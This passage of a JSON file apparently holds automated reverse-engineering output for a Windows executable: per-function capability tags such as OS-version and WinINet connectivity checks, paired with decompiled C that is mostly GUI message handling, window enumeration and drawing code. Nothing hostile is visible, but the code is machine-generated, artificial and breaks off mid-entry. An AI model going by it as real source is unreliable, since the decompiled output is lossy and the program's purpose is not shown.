        "decompiled_code": "\nint32_t * __cdecl fcn.00416e88(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 168
    },
    "00416f0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_60h\n\nuint __cdecl fcn.00416f0c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *arg_8h_00;\n    uint *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    code *pcVar10;\n    int32_t unaff_EBP;\n    int16_t iVar11;\n    uint *in_FS_OFFSET;\n    uint uVar12;\n    uint var_60h;\n    uint var_44h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = 0;\n    iVar4 = *(unaff_EBP + 8);\n    if (iVar4 == 0x111) {\n        iVar4 = (**(*arg_8h_00 + 0x78))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar4 != 0) {\ncode_r0x00417362:\n            *(unaff_EBP + -0x10) = 1;\n            goto code_r0x004173a6;\n        }\ncode_r0x00417095:\n        uVar12 = 0;\n        goto code_r0x00417097;\n    }\n    if (iVar4 == 0x4e) {\n        if (**(unaff_EBP + 0x10) != 0) {\n            iVar4 = (**(*arg_8h_00 + 0x7c))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\ncode_r0x00416f65:\n            if (iVar4 != 0) goto code_r0x004173a6;\n        }\n        goto code_r0x00417095;\n    }\n    puVar7 = *(unaff_EBP + 0x10);\n    if (iVar4 == 6) {\n        uVar12 = fcn.0041617d(puVar7);\n        fcn.00415ee5(arg_8h_00, *(unaff_EBP + 0xc), uVar12);\n    }\n    iVar11 = puVar7;\n    if ((iVar4 == 0x20) && (iVar4 = fcn.00415f46(arg_8h_00, iVar11, puVar7 >> 0x10),  iVar4 != 0))\n    goto code_r0x00417362;\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    *(unaff_EBP + -0x14) = uVar5;\n    uVar9 = uVar5 & 0x1ff ^ *(unaff_EBP + 8) & 0x1ff;\n    fcn.0041b683(7);\n    uVar5 = *(unaff_EBP + 8);\n    iVar4 = uVar9 * 0xc;\n    iVar6 = *(unaff_EBP + -0x14);\n    if ((uVar5 != *(uVar9 * 0xc + 0x42df08)) || (iVar6 != *(iVar4 + 0x42df10))) {\n        *(iVar4 + 0x42df08) = uVar5;\n        *(iVar4 + 0x42df10) = iVar6;\n        if (iVar6 != 0) {\n            while( true ) {\n                if (uVar5 < 0xc000) {\n                    iVar6 = fcn.00416e88(*(iVar6 + 4), uVar5, 0, 0);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 != 0) {\n                        *(iVar4 + 0x42df0c) = iVar6;\n                        fcn.0041b6f3(7);\n                        iVar4 = *(unaff_EBP + 0x10);\n                        goto code_r0x004170b5;\n                    }\n                }\n                else {\n                    iVar6 = fcn.00416e88(*(iVar6 + 4), 0xc000, 0, 0);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 != 0) {\n                        while( true ) {\n                            if (**(iVar6 + 0x10) == *(unaff_EBP + 8)) {\n                                *(iVar4 + 0x42df0c) = iVar6;\n                                fcn.0041b6f3(7);\n                                iVar4 = *(unaff_EBP + 0x10);\n                                goto code_r0x00417398;\n                            }\n                            iVar6 = fcn.00416e88(iVar6 + 0x18, 0xc000, 0, 0);\n                            *(unaff_EBP + 0x10) = iVar6;\n                            if (iVar6 == 0) break;\n                            iVar6 = *(unaff_EBP + 0x10);\n                        }\n                    }\n                }\n                iVar6 = **(unaff_EBP + -0x14);\n                *(unaff_EBP + -0x14) = iVar6;\n                if (iVar6 == 0) break;\n                iVar6 = *(unaff_EBP + -0x14);\n                uVar5 = *(unaff_EBP + 8);\n            }\n        }\n        *(iVar4 + 0x42df0c) = 0;\n        fcn.0041b6f3(7);\n        goto code_r0x00417095;\n    }\n    iVar4 = *(iVar4 + 0x42df0c);\n    *(unaff_EBP + 0x10) = iVar4;\n    fcn.0041b6f3(7);\n    if (iVar4 == 0) goto code_r0x00417095;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x00417398:\n        pcVar10 = *(iVar4 + 0x14);\ncode_r0x0041739b:\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x0041739f;\n    }\ncode_r0x004170b5:\n    iVar6 = *(unaff_EBP + 0x10);\n    pcVar10 = *(iVar4 + 0x14);\n    iVar4 = *(iVar6 + 0x10);\n    if (*(iVar6 + 8) == 0x1a) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        iVar6 = *(unaff_EBP + 0x10);\n        iVar4 = (-(uVar2 < 4) & 0xfffffff0) + 0x2f;\n    }\n    iVar3 = puVar7 >> 0x10;\n    // switch table (49 cases) at 0x4173ba\n    switch(iVar4) {\n    case 1:\n        puVar7 = *(unaff_EBP + 0xc);\n        fcn.00419389(puVar7);\n        goto code_r0x004171f0;\n    case 2:\n        puVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x004171f0;\n    case 3:\n    case 8:\n        uVar9 = puVar7 >> 0x10;\n        puVar7 = iVar11;\n        uVar5 = *(unaff_EBP + 0xc);\n        uVar9 = fcn.0041617d(uVar5, puVar7, uVar9);\n        goto code_r0x0041720b;\n    case 4:\n        fcn.004192e7();\n        uVar12 = puVar7[1];\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x20) = uVar12;\n        fcn.00415ddf();\n        uVar12 = *puVar7;\n        uVar1 = puVar7[2];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x44) = uVar12;\n        iVar4 = fcn.004161a4(uVar12);\n        if (iVar4 == 0) {\n            if ((arg_8h_00[0xd] != 0) && (iVar4 = fcn.00414239(*(unaff_EBP + -0x44)),  iVar4 != 0)) {\n                *(unaff_EBP + -0x28) = iVar4;\n            }\n            iVar4 = unaff_EBP + -0x60;\n        }\n        uVar12 = (*pcVar10)(unaff_EBP + -0x24, iVar4, uVar1);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x10) = uVar12;\n        fcn.004167ef();\n        *(unaff_EBP + -4) = 0xffffffff;\n        goto code_r0x004171c6;\n    case 5:\n        fcn.004192e7();\n        uVar12 = puVar7[2];\n        *(unaff_EBP + -0x20) = puVar7[1];\n        *(unaff_EBP + -4) = 2;\n        uVar12 = (*pcVar10)(unaff_EBP + -0x24, uVar12);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x10) = uVar12;\ncode_r0x004171c6:\n        fcn.00419406();\n        break;\n    case 6:\n        uVar5 = fcn.0041617d(puVar7, *(unaff_EBP + 0xc) >> 0x10);\n        goto code_r0x00417206;\n    case 7:\n        puVar7 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x0041739f;\n    case 9:\n    case 0x2a:\ncode_r0x004171f0:\n        uVar12 = (*pcVar10)(puVar7);\ncode_r0x004173a3:\n        *(unaff_EBP + -0x10) = uVar12;\n        break;\n    case 10:\n    case 0x21:\n        goto code_r0x0041739b;\n    case 0xb:\n        puVar7 = fcn.004189f4(puVar7);\n        uVar5 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x00417206:\n        uVar9 = *(unaff_EBP + 0xc);\ncode_r0x0041720b:\n        uVar12 = (*pcVar10)(uVar9, uVar5, puVar7);\n        goto code_r0x004173a3;\n    case 0xc:\n        (*pcVar10)();\n        break;\n    case 0xd:\n        puVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0041732f;\n    case 0xe:\n    case 0x12:\n    case 0x25:\n    case 0x2f:\n        goto code_r0x0041730f;\n    case 0xf:\n        puVar8 = iVar3;\n        iVar4 = iVar11;\n        goto code_r0x00417312;\n    case 0x10:\n    case 0x11:\n        puVar8 = puVar7 >> 0x10;\n        uVar5 = puVar7 & 0xffff;\n        goto code_r0x00417350;\n    case 0x13:\n        puVar8 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0041617d(puVar8);\n        fcn.0041617d(puVar7, uVar5);\n        uVar9 = arg_8h_00[7] == puVar7;\n        goto code_r0x00417354;\n    case 0x14:\n        puVar7 = *(unaff_EBP + 0xc);\n        fcn.00419389(puVar7);\n        goto code_r0x0041732f;\n    case 0x15:\n        puVar7 = *(unaff_EBP + 0xc);\n        fcn.004189f4(puVar7);\n        goto code_r0x0041732f;\n    case 0x16:\n        puVar8 = puVar7 >> 0x10;\n        uVar5 = puVar7 & 0xffff;\n        uVar9 = fcn.004189f4(*(unaff_EBP + 0xc), uVar5, puVar8);\n        goto code_r0x00417354;\n    case 0x17:\n        puVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x00417296;\n    case 0x18:\n        puVar8 = puVar7 >> 0x10;\n        uVar5 = puVar7 & 0xffff;\n        goto code_r0x004172b2;\n    case 0x19:\n        uVar5 = iVar11;\n        puVar8 = iVar3;\ncode_r0x004172b2:\n        uVar9 = fcn.0041617d(*(unaff_EBP + 0xc), uVar5, puVar8);\n        goto code_r0x00417354;\n    case 0x1a:\n        iVar4 = fcn.0041617d(*(unaff_EBP + 0xc), puVar7);\n        puVar8 = puVar7;\n        goto code_r0x00417312;\n    case 0x1b:\n        fcn.0041617d(puVar7);\ncode_r0x0041730f:\n        iVar4 = *(unaff_EBP + 0xc);\n        puVar8 = puVar7;\n        goto code_r0x00417312;\n    case 0x1c:\n        puVar8 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar5 = fcn.0041617d(puVar7, puVar8);\n        goto code_r0x0041733c;\n    case 0x1d:\n    case 0x1e:\n        iVar4 = *(unaff_EBP + 0xc);\n        iVar6 = *(iVar6 + 0x10);\n        *(unaff_EBP + 8) = iVar4;\n        puVar8 = *(unaff_EBP + 0xc) >> 0x10;\n        *(unaff_EBP + 0xc) = puVar8;\n        if (iVar6 == 0x1d) {\n            uVar5 = fcn.0041617d(puVar7);\n            uVar9 = *(unaff_EBP + 0xc);\n            puVar8 = puVar7;\n            goto code_r0x00417354;\n        }\ncode_r0x00417312:\n        (*pcVar10)(iVar4, puVar8);\n        break;\n    case 0x1f:\n    case 0x24:\n        goto code_r0x0041732f;\n    case 0x20:\n    case 0x2b:\n        (*pcVar10)(*(unaff_EBP + 0xc), puVar7);\n        goto code_r0x00417362;\n    case 0x22:\n        uVar5 = iVar11;\n        puVar7 = iVar3;\n        goto code_r0x0041739f;\n    case 0x23:\n        uVar12 = (*pcVar10)();\n        goto code_r0x004173a3;\n    case 0x2c:\ncode_r0x00417296:\n        fcn.0041617d(puVar7);\ncode_r0x0041732f:\n        (*pcVar10)(puVar7);\n        break;\n    case 0x2d:\n        uVar5 = fcn.0041617d(*(unaff_EBP + 0xc), puVar7);\ncode_r0x0041739f:\n        uVar12 = (*pcVar10)(uVar5, puVar7);\n        goto code_r0x004173a3;\n    case 0x2e:\n        iVar4 = (*pcVar10)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, puVar7 & 0xffff, puVar7 >> 0x10);\n        *(unaff_EBP + -0x10) = iVar4;\n        goto code_r0x00416f65;\n    case 0x30:\n        uVar5 = *(unaff_EBP + 0xc) >> 0x10;\n        puVar8 = puVar7;\ncode_r0x0041733c:\n        uVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x00417354;\n    case 0x31:\n        uVar5 = iVar11;\n        puVar8 = iVar3;\ncode_r0x00417350:\n        uVar9 = *(unaff_EBP + 0xc);\ncode_r0x00417354:\n        (*pcVar10)(uVar9, uVar5, puVar8);\n    }\ncode_r0x004173a6:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    uVar12 = 1;\ncode_r0x00417097:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar12;\n}\n",
        "token_count": 4107
    },
    "00417659": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00417659(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[7] != 0)) {\n        iVar2 = (**(*param_1 + 0xb0))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.004175ae();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.004175ae();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 183
    },
    "00417713": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417713(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.004161a4(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.00415fbc(iVar2, *(iVar2 + 0x1c), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.00417713(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "00417d47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417d47(int32_t hdc, uint arg_ch, int32_t arg_10h, int32_t hgdiobj, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpvObject;\n    uint crColor;\n    \n    if ((((hdc == 0) || (hgdiobj == 0)) || (arg_10h == 1)) || ((arg_10h == 0 || (arg_10h == 5)))) {\ncode_r0x00417db6:\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 2) {\n            iVar1 = fcn.00419960(arg_ch, 2);\n            if (iVar1 == 0) goto code_r0x00417db6;\n        }\n        (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0xc, &lpvObject);\n        (*_sym.imp.GDI32.dll_SetBkColor)(hdc, crColor);\n        if (arg_18h == -1) {\n            arg_18h = (*_sym.imp.USER32.dll_GetSysColor)(8);\n        }\n        (*_sym.imp.GDI32.dll_SetTextColor)(hdc, arg_18h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 304
    },
    "00418081": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418081(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    if (arg_8h != NULL) {\n        do {\n            if (*arg_8h == 0) break;\n            iVar3 = arg_8h[1];\n            iVar1 = *(arg_8h + 2);\n            puVar5 = arg_8h + 4;\n            if (iVar3 == 0x1234) {\ncode_r0x004180e3:\n                var_24h = 0xffffffff;\n                var_28h = 1;\n                iVar3 = 0x401;\n                puVar6 = &var_28h;\n                var_20h = puVar5;\ncode_r0x00418111:\n                iVar4 = (*pcVar2)(*(in_ECX + 0x1c), *arg_8h, iVar3, 0, puVar6);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n            }\n            else {\n                puVar6 = puVar5;\n                if (iVar3 == 0x401) {\n                    iVar3 = 0x180;\n                    goto code_r0x00418111;\n                }\n                if (iVar3 == 0x403) {\n                    iVar3 = 0x143;\n                }\n                if (iVar3 == 0x401) goto code_r0x004180e3;\n                if ((iVar3 == 0x180) || (iVar3 == 0x143)) goto code_r0x00418111;\n            }\n            arg_8h = puVar5 + iVar1;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.00417713(*(in_ECX + 0x1c), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 541
    },
    "0041889a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041889a(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x38) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n        iVar2 = fcn.00414239(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x34) != NULL)) {\n            (**(**(iVar2 + 0x34) + 0x8c))(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004188d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004188d7(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_104h;\n    uint var_4h;\n    \n    iVar1 = fcn.0041895b(arg_8h, &var_104h, 0x100);\n    if (0x100U - iVar1 < 3) {\n        iVar2 = 0x100;\n        do {\n            iVar3 = iVar2 + 0x100;\n            fcn.00415bec(iVar2 + 0xff, iVar3);\n            iVar1 = fcn.0041895b();\n            iVar2 = iVar3;\n        } while (iVar3 - iVar1 < 3);\n        fcn.00415c3b(0xffffffff);\n    }\n    else {\n        fcn.00415bc5(&var_104h);\n    }\n    return 0 < iVar1;\n}\n",
        "token_count": 213
    },
    "00418982": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00418982(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    iVar1 = fcn.0041ab76();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00415c8b(0x419af1);\n        iVar3 = fcn.00415c9d(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00418d0a(0x41e520, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.00415c8b(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x18);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 352
    },
    "00418a51": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00418a51(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00418a27();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 87
    },
    "00418baf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418baf(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    uVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xb);\n    *(param_1 + 8) = uVar2;\n    uVar2 = (*pcVar1)(0xc);\n    *(param_1 + 0xc) = uVar2;\n    if (*(param_1 + 0x68) == 0) {\n        fcn.0041b76e();\n    }\n    else {\n        fcn.0041b73e();\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n    pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n    uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x58);\n    *(param_1 + 0x18) = uVar3;\n    uVar3 = (*pcVar1)(uVar2, 0x5a);\n    *(param_1 + 0x1c) = uVar3;\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    return;\n}\n",
        "token_count": 292
    },
    "00418c10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00418c10(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.0041ab76();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (arg_8h != -1) {\n                iVar2 = fcn.0041455d();\n                if ((iVar2 != 0) && (*(iVar2 + 0x54) != NULL)) {\n                    (**(iVar2 + 0x54))(0, 0);\n                }\n            }\n            fcn.00418e2e();\n            fcn.00418e2e();\n            fcn.00418e2e();\n            fcn.00418e2e();\n            fcn.00418e2e();\n        }\n        iVar2 = fcn.0041ab50();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.0041b34f(0x41a53e);\n        if (iVar2 != 0) {\n            if (*(iVar3 + 0xc) != 0) {\n                uVar4 = fcn.00408096(*(iVar3 + 0xc));\n                if (*(iVar2 + 0xb8) <= uVar4) goto code_r0x00418cfb;\n            }\n            if (*(iVar2 + 0xb8) != 0) {\n                arg_8h = 0;\n                if (*(iVar3 + 0xc) != 0) {\n                    arg_8h = fcn.00408096(*(iVar3 + 0xc));\n                    fcn.0040795e(*(iVar3 + 0xc));\n                }\n                iVar2 = fcn.00407f59(*(iVar2 + 0xb8));\n                *(iVar3 + 0xc) = iVar2;\n                if ((iVar2 == 0) && (arg_8h != 0)) {\n                    uVar5 = fcn.00407f59(arg_8h);\n                    *(iVar3 + 0xc) = uVar5;\n                }\n            }\n        }\n    }\ncode_r0x00418cfb:\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 565
    },
    "00418d6f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00418d6f(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    if (arg_8h_00 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00414239(arg_8h_00);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00414239(arg_8h_00);\n            if (iVar2 == 0) {\n                uVar3 = fcn.00415c8b(0x419af1);\n                *(unaff_EBP + -4) = 0;\n                *(unaff_EBP + 8) = uVar3;\n                iVar2 = fcn.00418a99();\n                if (iVar2 == 0) {\n                    fcn.00414000();\n                }\n                piVar4 = fcn.0041426c(arg_8h_00);\n                uVar3 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0xffffffff;\n                *piVar4 = iVar2;\n                fcn.00415c8b(uVar3);\n                iVar1 = *(extraout_ECX + 0x40);\n                *(iVar1 + iVar2) = arg_8h_00;\n                if (*(extraout_ECX + 0x44) == 2) {\n                    *(iVar1 + iVar2 + 4) = arg_8h_00;\n                }\n            }\n            else {\n                iVar1 = *(extraout_ECX + 0x40);\n                *(iVar1 + iVar2) = arg_8h_00;\n                if (*(extraout_ECX + 0x44) == 2) {\n                    *(iVar1 + iVar2 + 4) = arg_8h_00;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 606
    },
    "00418e2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418e2e(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x2c) != 0);\n        while (var_8h != 0) {\n            fcn.004142fe(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x40) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x44) == 2) {\n                puVar1[1] = 0;\n            }\n            if (var_4h != NULL) {\n                (**(*var_4h + 4))(1);\n            }\n        }\n        fcn.0041414d();\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "004190b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
